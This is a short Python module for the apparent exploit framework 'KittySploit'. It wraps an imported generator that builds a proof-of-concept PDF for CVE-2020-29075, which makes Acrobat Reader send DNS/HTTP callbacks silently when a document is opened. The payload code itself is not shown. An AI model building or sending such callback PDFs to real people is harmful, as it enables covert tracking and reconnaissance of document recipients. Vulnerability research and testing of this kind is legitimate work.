#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.pdf.mixins import PdfCveMixin
from lib.pdf.generators.silent import write_silent_dns_catalog_aa


class Module(Auxiliary, PdfCveMixin):
    __info__ = {
        "name": 'PDF CVE-2020-29075 Silent DNS Callback',
        "description": 'Generate PDF PoC for CVE-2020-29075: silent DNS/HTTP via catalog /AA /WC, /WS, /DS without user prompt in Acrobat Reader.',
        "author": ["KittySploit Team"],
        "cve": ['CVE-2020-29075'],
        "references": ['https://nvd.nist.gov/vuln/detail/CVE-2020-29075'],
        "tags": ['pdf', 'cve-2020-29075', 'dns', 'silent', 'acrobat'],
    }

    PDF_GENERATORS = (
        write_silent_dns_catalog_aa,
    )

    CVE_IDS = ['CVE-2020-29075']
    MODULE_TITLE = 'PDF CVE-2020-29075 Silent DNS Callback'

    def run(self):
        return self.run_pdf_cve()